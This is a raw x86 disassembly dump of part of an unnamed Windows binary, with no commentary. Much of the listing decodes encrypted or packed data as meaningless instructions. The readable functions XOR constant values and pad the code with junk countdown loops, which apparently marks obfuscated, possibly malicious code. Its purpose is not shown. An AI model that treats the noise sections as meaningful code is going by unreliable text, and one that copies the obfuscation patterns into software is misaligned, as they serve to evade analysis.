  403122:	out    0x4e,eax
  403124:	cmp    BYTE PTR [edx],ah
  403126:	sbb    BYTE PTR [edi*4+0x225e0ce1],0x85
  40312e:	add    BYTE PTR [eax+0x1f],al
  403131:	push   0x1
  403133:	ror    ecx,cl
  403135:	push   0xbac03835
  40313a:	inc    edx
  40313b:	and    bh,bh
  40313d:	push   eax
  40313e:	dec    BYTE PTR [ebx+0xd8bc845]
  403144:	mov    al,0x3b
  403146:	inc    ecx
  403147:	add    BYTE PTR [ecx],al
  403149:	or     BYTE PTR [edi-0x17],bl
  40314c:	pushf  
  40314d:	add    DWORD PTR [eax],eax
  40314f:	add    BYTE PTR [edx],al
  403151:	adc    DWORD PTR [eax+0x21b389ab],ecx
  403157:	mov    cl,0x82
  403159:	xchg   edx,eax
  40315a:	pop    esp
  40315b:	shl    DWORD PTR [ebp-0x11],0xa
  40315f:	lahf   
  403160:	mov    edx,0xfa7e7e17
  403165:	jg     0x4031e5
  403167:	jle    0x4030fe
  403169:	or     esp,DWORD PTR [edx]
  40316b:	dec    edx
  40316c:	loop   0x40318a
  40316e:	es inc esi
  403170:	sub    ecx,esp
  403172:	lods   eax,DWORD PTR ds:[esi]
  403173:	ins    BYTE PTR es:[edi],dx
  403174:	rol    DWORD PTR [ebx+0x68],0x85
  403178:	sti    
  403179:	fwait
  40317a:	xlat   BYTE PTR ds:[ebx]
  40317b:	pop    esi
  40317c:	cdq    
  40317d:	dec    eax
  40317e:	mov    edx,0x914ee369
  403183:	xchg   DWORD PTR [edx-0x43],edx
  403186:	xlat   BYTE PTR ds:[ebx]
  403187:	fbld   TBYTE PTR [edi]
  403189:	mov    cl,0xf9
  40318b:	hlt    
  40318c:	mov    ch,dl
  40318e:	mov    edx,0xe4f9a07
  403193:	cmc    
  403194:	add    DWORD PTR [eax],esp
  403196:	jmp    0x7327f9b7
  40319b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40319c:	xor    BYTE PTR [edi],0xfa
  40319f:	mov    ch,0xd4
  4031a1:	test   BYTE PTR [ebp+0x27],ah
  4031a4:	mov    esi,0x3ce53ee6
  4031a9:	out    0x14,al
  4031ab:	pop    esp
  4031ac:	add    ebp,DWORD PTR [edx]
  4031ae:	int3   
  4031af:	mov    esp,?
  4031b1:	jmp    0x5e676b32
  4031b6:	clc    
  4031b7:	ds ror eax,1
  4031ba:	and    DWORD PTR [edi-0x26866f5a],eax
  4031c0:	jo     0x403230
  4031c2:	je     0x403192
  4031c4:	inc    ebx
  4031c5:	mov    al,dl
  4031c7:	dec    esi
  4031c8:	or     al,0x60
  4031ca:	xor    al,dl
  4031cc:	outs   dx,DWORD PTR ds:[esi]
  4031cd:	stos   BYTE PTR es:[edi],al
  4031ce:	push   ecx
  4031cf:	in     eax,0xa
  4031d1:	mov    edx,DWORD PTR [ecx]
  4031d3:	aad    0x8b
  4031d5:	ret    0x7390
  4031d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4031d9:	or     dl,bl
  4031db:	(bad)  
  4031de:	in     al,0xf7
  4031e0:	push   eax
  4031e1:	sub    eax,0x97eda3e
  4031e6:	aaa    
  4031e7:	add    al,0x6f
  4031e9:	test   BYTE PTR [ebp+0x3b],ah
  4031ec:	test   eax,0x5c1d9f3a
  4031f1:	clc    
  4031f2:	pusha  
  4031f3:	dec    edx
  4031f4:	xor    ch,BYTE PTR [eax+0x1d576d96]
  4031fa:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4031fc:	bound  eax,QWORD PTR [eax+0x19105584]
  403202:	repz mov al,ds:0xb0eb9346
  403208:	cmc    
  403209:	push   esi
  40320a:	je     0x4031ef
  40320c:	clc    
  40320d:	and    al,0xab
  40320f:	mov    esi,0xf3a3920c
  403214:	xchg   esi,eax
  403215:	lock push es
  403217:	xchg   DWORD PTR [eax+0x2a3523d],ecx
  40321d:	popa   
  40321e:	add    eax,0x52f37109
  403223:	lods   eax,DWORD PTR ds:[esi]
  403224:	pop    eax
  403225:	scas   eax,DWORD PTR es:[edi]
  403226:	jge    0x403290
  403228:	pand   mm1,QWORD PTR [edx+ecx*1+0x1e]
  40322d:	and    edx,eax
  40322f:	cwde   
  403230:	sahf   
  403231:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403232:	(bad)  
  403233:	neg    DWORD PTR [eax+0x39]
  403236:	sbb    BYTE PTR [esi-0x70],bl
  403239:	inc    esi
  40323a:	xor    BYTE PTR [edx+0x6f],bh
  40323d:	call   0xedfe:0xe6c50f92
  403244:	repz jb 0x4031cf
  403247:	retf   
  403248:	jne    0x403285
  40324a:	jnp    0x40324d
  40324c:	test   DWORD PTR [ecx+0x7fdaaffb],ecx
  403252:	(bad)  
  403253:	jmp    0x5d920b96
  403258:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403259:	jo     0x40323d
  40325b:	cmp    al,0x17
  40325d:	mov    al,ds:0x2fe95e31
  403262:	pop    es
  403263:	imul   edx,ecx,0x42
  403266:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403267:	ins    DWORD PTR es:[edi],dx
  403268:	into   
  403269:	fldenv [edi+0x57]
  40326c:	fnsave [ebx-0x5]
  40326f:	repnz dec ebp
  403271:	adc    al,0x12
  403273:	adc    BYTE PTR [esi+edi*4+0x1d580dfb],dh
  40327a:	jp     0x40322a
  40327c:	frstor [edi-0x74]
  40327f:	out    0xaf,al
  403281:	(bad)  [edi+0x21]
  403284:	aad    0xb7
  403286:	push   es
  403287:	ins    BYTE PTR es:[edi],dx
  403288:	aaa    
  403289:	jmp    0xbaf501ed
  40328e:	jo     0x40327a
  403290:	aad    0x6a
  403292:	repz and BYTE PTR [esi],bh
  403295:	cwde   
  403296:	mov    ebx,DWORD PTR [esi]
  403298:	dec    edi
  403299:	and    bh,BYTE PTR cs:[esp+ebp*8+0x58]
  40329e:	mov    es,WORD PTR [ebp-0x70ad47f6]
  4032a4:	sbb    DWORD PTR [edi+0x3],ebp
  4032a7:	cmp    eax,0x1b429efe
  4032ac:	cmp    al,BYTE PTR [eax-0x4b]
  4032af:	push   ss
  4032b0:	jns    0x40324f
  4032b2:	das    
  4032b3:	and    cl,BYTE PTR [ebp+0xd]
  4032b6:	mov    eax,0x8039d8bc
  4032bb:	(bad)  
  4032bc:	xor    bl,ah
  4032be:	sbb    DWORD PTR [esi],edi
  4032c0:	mov    dl,0x83
  4032c2:	inc    ecx
  4032c3:	push   eax
  4032c4:	mov    esi,DWORD PTR [esp+edi*4]
  4032c7:	outs   dx,BYTE PTR ds:[esi]
  4032c8:	icebp  
  4032c9:	lock outs dx,BYTE PTR ds:[esi]
  4032cb:	in     eax,dx
  4032cc:	jg     0x40332b
  4032ce:	loopne 0x4032df
  4032d0:	aad    0x83
  4032d2:	aam    0xab
  4032d4:	fsub   DWORD PTR [ebp-0x3d]
  4032d7:	mov    ebx,fs
  4032d9:	test   BYTE PTR [ecx+0x30ffb8fa],cl
  4032df:	shl    DWORD PTR [ecx+eax*2-0x28a43a30],0x48
  4032e7:	sbb    al,0xde
  4032e9:	xchg   ebx,eax
  4032ea:	sbb    BYTE PTR [ebp+0x5e],ah
  4032ed:	pop    ebx
  4032ee:	leave  
  4032ef:	ret    
  4032f0:	push   ebp
  4032f1:	mov    ebp,esp
  4032f3:	sub    esp,0x2c
  4032f6:	leave  
  4032f7:	ret    0x10
  4032fa:	push   ebp
  4032fb:	mov    ebp,esp
  4032fd:	sub    esp,0x44
  403300:	push   edi
  403301:	mov    eax,DWORD PTR [ebp+0xc]
  403304:	and    DWORD PTR ds:0x43365b,0x0
  40330e:	xor    ecx,ecx
  403310:	add    ecx,DWORD PTR ds:0x43365b
  403316:	inc    ecx
  403317:	mov    DWORD PTR ds:0x43365b,ecx
  40331d:	cmp    DWORD PTR ds:0x43365b,0x26
  403324:	jne    0x403335
  40332a:	push   0x476d
  40332f:	call   DWORD PTR ds:0x412278
  403335:	cmp    DWORD PTR ds:0x43365b,0x1d
  40333c:	jb     0x40330e
  403342:	not    edx
  403344:	mov    DWORD PTR [ebp-0x10],eax
  403347:	xor    DWORD PTR ds:0x4336ef,0x1717
  403351:	mov    eax,DWORD PTR [ebp+0x8]
  403354:	sbb    DWORD PTR ds:0x4336d7,0x2700
  40335e:	mov    DWORD PTR [ebp+0x8],0xf89c8531
  403365:	mov    ecx,DWORD PTR ds:0x43361f
  40336b:	add    DWORD PTR ds:0x433603,ecx
  403371:	mov    DWORD PTR [ebp-0x20],0xf89c8532
  403378:	xor    edi,0x7913
  40337e:	mov    edx,DWORD PTR [ebp+0x8]
  403381:	mov    DWORD PTR ds:0x433657,0x1e
  40338b:	cmp    DWORD PTR ds:0x433657,0x0
  403392:	je     0x4033dc
  403398:	cmp    DWORD PTR ds:0x433657,0xb
  40339f:	jne    0x4033ae
  4033a5:	push   DWORD PTR [ebp-0x18]
  4033a8:	call   DWORD PTR ds:0x41227c
  4033ae:	cmp    DWORD PTR ds:0x433657,0xc
  4033b5:	jne    0x4033c8
  4033bb:	mov    edi,DWORD PTR ds:0x433657
  4033c1:	dec    edi
  4033c2:	mov    DWORD PTR ds:0x433657,edi
  4033c8:	xor    edi,edi
  4033ca:	add    edi,DWORD PTR ds:0x433657
  4033d0:	dec    edi
  4033d1:	mov    DWORD PTR ds:0x433657,edi
  4033d7:	jmp    0x40338b
  4033dc:	mov    DWORD PTR [ebp-0x40],eax
  4033df:	dec    DWORD PTR ds:0x4336e7
  4033e5:	mov    eax,0x7510854
  4033ea:	xor    edx,eax
  4033ec:	mov    ecx,DWORD PTR ds:0x433647
  4033f2:	mov    edi,DWORD PTR ds:0x433687
  4033f8:	sub    ecx,edi
  4033fa:	imul   ecx,DWORD PTR [ecx+edi*1]
  4033fe:	mov    ecx,0x32729b
  403403:	add    edx,ecx
  403405:	mov    DWORD PTR ds:0x433667,0x1c
  40340f:	cmp    DWORD PTR ds:0x433667,0x0
  403416:	je     0x40345e
  40341c:	cmp    DWORD PTR ds:0x433667,0xa
  403423:	jne    0x403432
  403429:	push   DWORD PTR [ebp-0x24]
  40342c:	call   DWORD PTR ds:0x412288
  403432:	cmp    DWORD PTR ds:0x433667,0xb
  403439:	jne    0x40344c
  40343f:	mov    edi,DWORD PTR ds:0x433667
  403445:	dec    edi
  403446:	mov    DWORD PTR ds:0x433667,edi
  40344c:	mov    edi,DWORD PTR ds:0x433667
  403452:	dec    edi
  403453:	mov    DWORD PTR ds:0x433667,edi
  403459:	jmp    0x40340f
  40345e:	mov    DWORD PTR [ebp-0x8],edx
  403461:	mov    edx,DWORD PTR ds:0x4336e3
  403467:	and    edx,DWORD PTR ds:0x433717
  40346d:	mov    DWORD PTR ds:0x4336e3,edx
  403473:	mov    edx,DWORD PTR [ebp+0x8]
  403476:	sbb    DWORD PTR ds:0x43369b,0x6be7
  403480:	xor    edx,eax
  403482:	add    edx,ecx
  403484:	not    edi
  403486:	mov    DWORD PTR [ebp+0xc],edx
  403489:	not    edi
  40348b:	mov    DWORD PTR [ebp-0x4],0xf89c85d1
  403492:	mov    DWORD PTR [ebp-0x28],0xf89c8533
  403499:	mov    edx,DWORD PTR ds:0x43371f
  40349f:	adc    DWORD PTR ds:0x4335ff,edx
  4034a5:	mov    DWORD PTR [ebp-0x2c],0xf89c853c
  4034ac:	adc    edx,edx
  4034ae:	mov    DWORD PTR [ebp-0x30],0xf89c853d
  4034b5:	mov    DWORD PTR [ebp-0x34],0xf89c853e
  4034bc:	mov    DWORD PTR ds:0x433717,0x10
  4034c6:	cmp    DWORD PTR ds:0x433717,0x0
  4034cd:	je     0x403517
  4034d3:	cmp    DWORD PTR ds:0x433717,0x9
  4034da:	jne    0x4034eb
  4034e0:	push   0x5d47
  4034e5:	call   DWORD PTR ds:0x41233c
  4034eb:	cmp    DWORD PTR ds:0x433717,0xa
  4034f2:	jne    0x403505
  4034f8:	mov    edi,DWORD PTR ds:0x433717
  4034fe:	dec    edi
  4034ff:	mov    DWORD PTR ds:0x433717,edi
  403505:	mov    edi,DWORD PTR ds:0x433717
  40350b:	dec    edi
  40350c:	mov    DWORD PTR ds:0x433717,edi
  403512:	jmp    0x4034c6
  403517:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  40351e:	and    DWORD PTR ds:0x43372b,ecx
  403524:	jmp    0x403827
  403529:	sbb    ecx,ebp
  40352b:	add    ah,dl
  40352d:	lock shr ebx,1
  403530:	icebp  
  403531:	mov    ?,WORD PTR [ebp+0x6727d48a]
  403537:	adc    al,0xde
  403539:	(bad)  
  40353a:	adc    eax,0x7c587e7e
  40353f:	jle    0x4035bf
  403541:	inc    ax
  403543:	xacquire xchg BYTE PTR [eax+eiz*1],ah
  403547:	push   ebx
  403548:	rcl    BYTE PTR [ebp-0x6a],cl
  40354b:	sbb    ebx,DWORD PTR [eax+0x63]
  40354e:	(bad)  
  40354f:	out    0xa5,eax
  403551:	loop   0x4035c7
  403553:	fdivr  DWORD PTR [eax-0xb0274e7]
  403559:	or     eax,0x6a32f16c
  40355e:	cdq    
  40355f:	js     0x403511
  403561:	or     esi,DWORD PTR [ebx+ebp*4+0x7d3b187b]
  403568:	div    ecx
  40356a:	cmp    eax,0x471c89a8
  40356f:	mov    dh,0x34
  403571:	test   DWORD PTR ds:0x35250e76,ecx
  403577:	scas   al,BYTE PTR es:[edi]
  403578:	dec    edx
  403579:	dec    edi
  40357a:	out    dx,al
  40357b:	int3   
  40357c:	stc    
  40357d:	aas    
  40357e:	adc    ecx,DWORD PTR [ebp+0x2e]
  403581:	dec    ebp
  403582:	es add al,0xca
  403585:	cld    
  403586:	xor    eax,edx
  403588:	les    edx,FWORD PTR [esi]
  40358a:	stos   DWORD PTR es:[edi],eax
  40358b:	xchg   esi,eax
  40358c:	rcl    BYTE PTR [ecx+0x108c8f3d],0x1
  403593:	inc    esi
  403594:	add    DWORD PTR [esi],ecx
  403596:	in     al,dx
  403597:	cmp    ah,ah
  403599:	jg     0x403613
  40359b:	scas   al,BYTE PTR es:[edi]
  40359c:	pusha  
  40359d:	adc    eax,0xf96cba7e
  4035a2:	jge    0x40357f
  4035a4:	lock icebp 
  4035a6:	pop    ebx
  4035a7:	shl    BYTE PTR ds:0x277e9dc4,cl
  4035ad:	(bad)  
  4035ae:	push   0x53f6ca9c
  4035b3:	out    dx,al
  4035b4:	dec    edi
  4035b5:	mov    WORD PTR ds:0xd5b679cf,ds
  4035bb:	jl     0x4035ca
  4035bd:	mov    ebp,0xe6f09610
  4035c2:	out    0x16,al
  4035c4:	lods   al,BYTE PTR ds:[esi]
  4035c5:	add    eax,0x470b6b3e
  4035ca:	or     DWORD PTR [ebx-0x11],ebp
  4035cd:	cmp    eax,0x39d842c5
  4035d2:	xchg   edx,eax
  4035d3:	daa    
  4035d4:	sub    eax,0x119ba81
  4035d9:	or     BYTE PTR [eax+0x22],0xbc
  4035dd:	xchg   ecx,eax
  4035de:	mov    esi,0xf57605a6
  4035e3:	mov    dl,0x93
  4035e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4035e6:	sar    BYTE PTR [ebx-0x7a],0xd7
  4035ea:	sub    edi,ecx
  4035ec:	mov    DWORD PTR [ebx-0xd185747],esp
  4035f2:	mov    eax,ds:0xf1a959bc
  4035f7:	loop   0x403615
  4035f9:	push   ds
  4035fa:	cmp    al,0x45
  4035fc:	xor    edx,eax
  4035fe:	lods   eax,DWORD PTR ds:[esi]
  4035ff:	push   edi
  403600:	in     al,dx
  403601:	jmp    0x40362f
  403603:	rol    DWORD PTR [edx+0xc4e469c],0xe9
  40360a:	(bad)  [eax-0x1b]
  40360d:	and    cl,BYTE PTR [esi+eiz*4-0x4]
  403611:	ret    
  403612:	xor    BYTE PTR [esi],ah
  403614:	mov    ecx,0xcb7bb8db
  403619:	lds    edx,FWORD PTR [ebx+0x7e0899cd]
  40361f:	lock push edi
  403621:	in     eax,0x64
  403623:	outs   dx,BYTE PTR ds:[esi]
  403624:	mov    esi,0x504167dd
  403629:	xchg   esi,eax
  40362a:	push   0x73
  40362c:	or     BYTE PTR ds:0x3e0311d1,ch
  403632:	mov    ebp,0xb6cb900a
  403637:	sub    al,0xe8
  403639:	and    DWORD PTR [ebp+ecx*8+0x44f3ff18],ebx
  403640:	clc    
  403641:	arpl   WORD PTR [esi-0x49],cx
  403644:	leave  
  403645:	jns    0x4035ef
  403647:	cmc    
  403648:	mov    bh,0x8f
  40364a:	lods   al,BYTE PTR ds:[esi]
  40364b:	arpl   WORD PTR [eax],dx
  40364d:	push   esi
  40364e:	(bad)  
  40364f:	pop    ds
  403650:	inc    edx
  403651:	out    dx,al
  403652:	jbe    0x40363e
  403654:	scas   eax,DWORD PTR es:[edi]
  403655:	sub    ah,bl
  403657:	aaa    
  403658:	pushf  
  403659:	rcl    DWORD PTR ds:0x4c01525f,0xd
  403660:	and    al,0x8b
  403662:	sbb    DWORD PTR [edi-0x4a576ff5],ecx
  403668:	data16 stc 
  40366a:	mov    esp,0x1c88cabf
  40366f:	cmc    
  403670:	or     eax,0x5723da45
  403675:	add    eax,esp
  403677:	xchg   edx,eax
  403678:	mov    ebx,DWORD PTR [edx+0x5d8bc6a0]
  40367e:	xor    cl,dh
  403680:	in     al,dx
  403681:	aam    0x29
  403683:	pusha  
  403684:	jno    0x4036e3
  403686:	inc    ecx
  403687:	push   ebp
  403688:	sub    al,BYTE PTR [ebx]
  40368a:	ss jns 0x40363f
  40368d:	mov    dl,0xde
  40368f:	loope  0x40363f
  403691:	push   eax
  403692:	in     al,0x4
  403694:	ins    DWORD PTR es:[edi],dx
  403695:	int    0xe4
  403697:	dec    eax
  403698:	sub    BYTE PTR [ecx],dl
  40369a:	js     0x40364b
  40369c:	arpl   WORD PTR [esi+esi*4],di
  40369f:	ds in  eax,dx
  4036a1:	mov    eax,0x770664c7
  4036a6:	jecxz  0x4036d6
  4036a8:	mov    ebx,0x3ab115cf
  4036ad:	lock fs xchg ecx,eax
  4036b0:	mov    edi,0x5848d003
  4036b5:	cmp    DWORD PTR [ebx],ebx
  4036b7:	outs   dx,BYTE PTR ds:[esi]
  4036b8:	mov    esi,0x453f2635
  4036bd:	in     al,0xe1
  4036bf:	and    al,bh
  4036c1:	data16 jb 0x40368e
  4036c4:	mov    cl,0xfa
  4036c6:	rcr    BYTE PTR [edx+edi*1],cl
  4036c9:	jo     0x4036ea
  4036cb:	add    edi,ebp
  4036cd:	pop    es
  4036ce:	int3   
  4036cf:	mov    eax,0x3558fa1c
  4036d4:	and    BYTE PTR [ebx-0x7962a3a9],0xe7
  4036db:	gs push edx
  4036dd:	and    al,0x2a
  4036df:	pushf  
  4036e0:	sub    DWORD PTR ds:0x599ce26,esp
  4036e6:	stos   DWORD PTR es:[edi],eax
  4036e7:	test   eax,0x50e191d2
  4036ec:	in     al,dx
  4036ed:	xor    BYTE PTR [ebp+0x4f],al
  4036f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4036f1:	cld    
  4036f2:	test   eax,0x95213cd3
  4036f7:	jno    0x403715
  4036f9:	(bad)  
  4036fa:	cmc    
  4036fb:	enter  0xe04c,0x73
  4036ff:	gs mov bl,0xee
  403702:	popf   
  403703:	xchg   DWORD PTR [esi+0x75],ebx
  403706:	push   ebp
  403707:	je     0x403772
  403709:	inc    eax
  40370a:	out    dx,al
  40370b:	push   DWORD PTR [edi+0x276cc006]
  403711:	out    0x5,eax
  403713:	dec    ebp
  403714:	xchg   edx,eax
  403715:	mov    dh,0x85
  403717:	adc    edi,esp
  403719:	pop    es
  40371a:	xor    BYTE PTR [esi+ebx*4+0x734e0482],bh
  403721:	ja     0x403728
  403723:	cdq    
  403724:	mov    al,ds:0x713b7d39
  403729:	in     al,dx
  40372a:	clc    
  40372b:	jb     0x4037ab
  40372d:	fst    DWORD PTR [esi+ebp*4+0x1f]
  403731:	xchg   ebx,eax
  403732:	ret    0xce2d
  403735:	add    eax,0x388ee245
  40373a:	pop    edi
  40373b:	in     eax,dx
  40373c:	out    dx,eax
  40373d:	inc    eax
  40373e:	std    
  40373f:	pop    eax
  403740:	aam    0xa0
  403742:	or     cl,dh
  403744:	sahf   
  403745:	mov    edx,0xa83a15d6
  40374a:	hlt    
  40374b:	mov    esp,0xcaaefa4
  403750:	sub    esi,DWORD PTR [ecx]
  403752:	mov    dl,0xd2
  403754:	ftst   
  403756:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403757:	addr16 std 
  403759:	lahf   
  40375a:	in     al,0x7e
  40375c:	test   al,0xb6
  40375e:	out    0x53,eax
  403760:	add    eax,0x5f1c73cb
  403765:	stos   BYTE PTR es:[edi],al
  403766:	icebp  
  403767:	sub    eax,0xe5fc15e3
  40376c:	ja     0x4037d3
  40376e:	push   ebp
  40376f:	into   
  403770:	pop    edx
  403771:	out    dx,eax
  403772:	and    bh,cl
  403774:	add    ebp,DWORD PTR [esi]
  403776:	lock pop esp
  403778:	cwde   
  403779:	and    bh,ch
  40377b:	mov    bh,ah
  40377d:	and    ebx,esp
  40377f:	mov    WORD PTR [eax-0x75],cs
  403782:	out    dx,al
  403783:	fcmove st,st(7)
  403785:	shl    BYTE PTR [ebp-0x7d],1
  403788:	popfw  
  40378a:	dec    ecx
  40378b:	mov    cl,0x61
  40378d:	iret   
  40378e:	xor    eax,0x2d5355ea
  403793:	ins    DWORD PTR es:[edi],dx
  403794:	popf   
  403795:	sahf   
  403796:	sub    DWORD PTR [ebp+0x323b4e09],ebp
  40379c:	std    
  40379d:	aas    
  40379e:	jb     0x40376b
  4037a0:	mov    dl,0xac
  4037a2:	out    dx,eax
  4037a3:	jne    0x403780
  4037a5:	jb     0x40375a
  4037a7:	pop    ds
  4037a8:	jge    0x40374e
  4037aa:	inc    ebp
  4037ab:	out    0xc9,eax
  4037ad:	dec    eax
  4037ae:	add    DWORD PTR [esi],edx
  4037b0:	stc    
  4037b1:	div    BYTE PTR [esi+ebx*1+0x668d5291]
  4037b8:	mov    BYTE PTR [esi],cl
  4037ba:	pop    es
  4037bb:	jae    0x403756
  4037bd:	mov    edi,0x3d70efa7
  4037c2:	ins    BYTE PTR es:[edi],dx
  4037c3:	cmp    DWORD PTR [ebx+eax*4],edx
  4037c6:	and    ebp,ebp
  4037c8:	or     al,ah
  4037ca:	mov    eax,0x4c6943a5
  4037cf:	pop    esp
  4037d0:	dec    ebp
  4037d1:	imul   DWORD PTR [edi+0x6d906862]
  4037d7:	mov    WORD PTR [edi+0x3b168e6b],gs
  4037dd:	(bad)  
  4037de:	dec    ebx
  4037df:	jno    0x403764
  4037e1:	jle    0x4037ec
  4037e3:	mov    ecx,edx
  4037e5:	(bad)  
  4037e6:	cmp    dl,ch
  4037e8:	cli    
  4037e9:	push   esi
  4037ea:	xor    al,0xcd
  4037ec:	lea    eax,[ecx-0x6f]
  4037ef:	adc    DWORD PTR [esi+0x29172963],0xffffff8a
  4037f6:	sbb    edx,DWORD PTR [ecx+0x552c82ed]
  4037fc:	add    eax,0x5921a748
  403801:	fiadd  WORD PTR [ebx+0x61fda63b]
  403807:	cmp    DWORD PTR [ecx+0x1de0895c],edx
  40380d:	or     eax,0xc7745ec5
  403812:	outs   dx,BYTE PTR ds:[esi]
  403813:	dec    edi
  403814:	clc    
  403815:	mov    al,0x94
  403817:	push   es
  403818:	mov    al,ds:0xabef706c
  40381d:	and    DWORD PTR [ebp-0x7aae254b],esi
  403823:	mov    esp,0xc7dff9cc
  403828:	inc    ebp
  403829:	les    edi,FWORD PTR [eax]
  40382b:	test   DWORD PTR [eax+edi*8+0x35fb3d1b],ebx
  403832:	inc    ebx
  403833:	add    BYTE PTR [ebx+0x3d1b0855],cl
  403839:	stos   DWORD PTR es:[edi],eax
  40383a:	ss inc ebx
  40383c:	add    BYTE PTR [ebx],dh
  40383e:	rol    BYTE PTR [ecx+0x43372725],1
  403844:	add    BYTE PTR [eax],al
  403846:	add    BYTE PTR [eax],al
  403848:	add    BYTE PTR [ebx],dh
  40384a:	inc    DWORD PTR [ebx]
  40384c:	cmp    eax,0x433727
  403851:	inc    edi
  403852:	mov    DWORD PTR ds:0x433727,edi
  403858:	cmp    DWORD PTR ds:0x433727,0xc
  40385f:	jne    0x403882
  403865:	push   0x86d9
  40386a:	push   0x47ad
  40386f:	push   0x8605
  403874:	push   DWORD PTR [ebp-0x24]
  403877:	push   0x3fd8
  40387c:	call   DWORD PTR ds:0x41228c
  403882:	cmp    DWORD PTR ds:0x433727,0xb
  403889:	jne    0x40389c
  40388f:	mov    edi,DWORD PTR ds:0x433727
  403895:	inc    edi
  403896:	mov    DWORD PTR ds:0x433727,edi
  40389c:	cmp    DWORD PTR ds:0x433727,0x17
  4038a3:	jb     0x403849
  4038a9:	or     edi,0x3f73
  4038af:	mov    edi,DWORD PTR [ebp-0x10]
  4038b2:	sub    DWORD PTR ds:0x43366b,0x43372b
  4038bc:	add    edx,ecx
  4038be:	mov    DWORD PTR ds:0x433693,0x73ae
  4038c8:	cmp    edi,edx
  4038ca:	mov    DWORD PTR ds:0x4336eb,0x7cd1
  4038d4:	je     0x4057b4
  4038da:	mov    DWORD PTR ds:0x433727,0x58cf
  4038e4:	push   ebx
  4038e5:	jmp    0x40578f
  4038ea:	xor    DWORD PTR ds:0x4336eb,0x4336ab
  4038f4:	mov    edx,DWORD PTR [ebp-0x8]
  4038f7:	sub    DWORD PTR ds:0x4335fb,ecx
  4038fd:	mov    edi,DWORD PTR [ebp-0x10]
  403900:	sub    edi,edx
  403902:	xor    DWORD PTR ds:0x433617,edi
  403908:	mov    edx,DWORD PTR [ebp-0x4]
  40390b:	xor    DWORD PTR ds:0x433613,0x16cd
  403915:	xor    edx,eax
  403917:	mov    DWORD PTR ds:0x43371b,0x2437
  403921:	add    edx,ecx
  403923:	cmp    edi,edx
  403925:	jb     0x4057b3
  40392b:	mov    DWORD PTR ds:0x4335ff,0x1d
  403935:	cmp    DWORD PTR ds:0x4335ff,0x0
  40393c:	je     0x40399d
  403942:	cmp    DWORD PTR ds:0x4335ff,0x6
  403949:	jne    0x40396b
  40394f:	push   DWORD PTR [ebp-0x28]
  403952:	push   DWORD PTR [ebp-0x14]
  403955:	push   0x0
  403957:	push   0x6853
  40395c:	push   DWORD PTR [ebp-0x20]
  40395f:	push   DWORD PTR [ebp-0x1c]
  403962:	push   DWORD PTR [ebp-0xc]
  403965:	call   DWORD PTR ds:0x4120b8
  40396b:	cmp    DWORD PTR ds:0x4335ff,0x7
  403972:	jne    0x403985
  403978:	mov    ebx,DWORD PTR ds:0x4335ff
  40397e:	dec    ebx
  40397f:	mov    DWORD PTR ds:0x4335ff,ebx
  403985:	mov    ebx,DWORD PTR ds:0x4335ff
  40398b:	dec    ebx
  40398c:	mov    DWORD PTR ds:0x4335ff,ebx
  403992:	jmp    0x403935
  403997:	xor    edx,DWORD PTR ds:0x433667
  40399d:	mov    edx,DWORD PTR [ebp-0x28]
  4039a0:	mov    edi,DWORD PTR ds:0x433613
  4039a6:	sub    edi,DWORD PTR ds:0x433723
  4039ac:	mov    DWORD PTR ds:0x433613,edi
  4039b2:	mov    edi,DWORD PTR [ebp-0x4]
  4039b5:	xor    edx,eax
  4039b7:	mov    DWORD PTR ds:0x433607,0x1b
  4039c1:	cmp    DWORD PTR ds:0x433607,0x0
  4039c8:	je     0x4039fe
  4039ce:	cmp    DWORD PTR ds:0x433607,0x26
  4039d5:	jne    0x4039e4
  4039db:	push   DWORD PTR [ebp-0x18]
  4039de:	call   DWORD PTR ds:0x4120bc
  4039e4:	xor    ebx,ebx
  4039e6:	xor    ebx,DWORD PTR ds:0x433607
  4039ec:	dec    ebx
  4039ed:	mov    DWORD PTR ds:0x433607,ebx
  4039f3:	jmp    0x4039c1
  4039f8:	neg    DWORD PTR ds:0x433617
  4039fe:	xor    edi,eax
  403a00:	and    DWORD PTR ds:0x4335fb,0x0
  403a0a:	xor    ebx,ebx
  403a0c:	or     ebx,DWORD PTR ds:0x4335fb
  403a12:	inc    ebx
  403a13:	mov    DWORD PTR ds:0x4335fb,ebx
  403a19:	cmp    DWORD PTR ds:0x4335fb,0x25
  403a20:	jne    0x403a31
  403a26:	push   0x66db
  403a2b:	call   DWORD PTR ds:0x4120c0
  403a31:	cmp    DWORD PTR ds:0x4335fb,0x1e
  403a38:	jb     0x403a0a
  403a3e:	add    edi,ecx
  403a40:	add    edx,ecx
  403a42:	mov    DWORD PTR ds:0x4336d7,0x19
  403a4c:	cmp    DWORD PTR ds:0x4336d7,0x0
  403a53:	je     0x403a80
  403a59:	cmp    DWORD PTR ds:0x4336d7,0x26
  403a60:	jne    0x403a6e
  403a66:	push   0x0
  403a68:	call   DWORD PTR ds:0x4120c4
  403a6e:	mov    ebx,DWORD PTR ds:0x4336d7
  403a74:	dec    ebx
  403a75:	mov    DWORD PTR ds:0x4336d7,ebx
  403a7b:	jmp    0x403a4c
  403a80:	imul   edx,edi
  403a83:	mov    edi,DWORD PTR [ebp-0x8]
  403a86:	and    DWORD PTR ds:0x43371b,ebx
  403a8c:	mov    ebx,DWORD PTR [ebp-0x10]
  403a8f:	sub    ebx,edi
  403a91:	cmp    ebx,edx
  403a93:	ja     0x403aa5
  403a99:	mov    edx,DWORD PTR [ebp-0x4]
  403a9c:	xor    edx,eax
  403a9e:	add    edx,ecx
  403aa0:	jmp    0x40478a
  403aa5:	mov    edx,DWORD PTR [ebp-0x2c]
  403aa8:	mov    edi,DWORD PTR [ebp-0x4]
  403aab:	xor    edx,eax
  403aad:	xor    edi,eax
  403aaf:	add    edi,ecx
  403ab1:	add    edx,ecx
  403ab3:	imul   edx,edi
  403ab6:	mov    edi,DWORD PTR [ebp-0x8]
  403ab9:	jmp    0x403dbc
  403abe:	pop    ebp
  403abf:	cli    
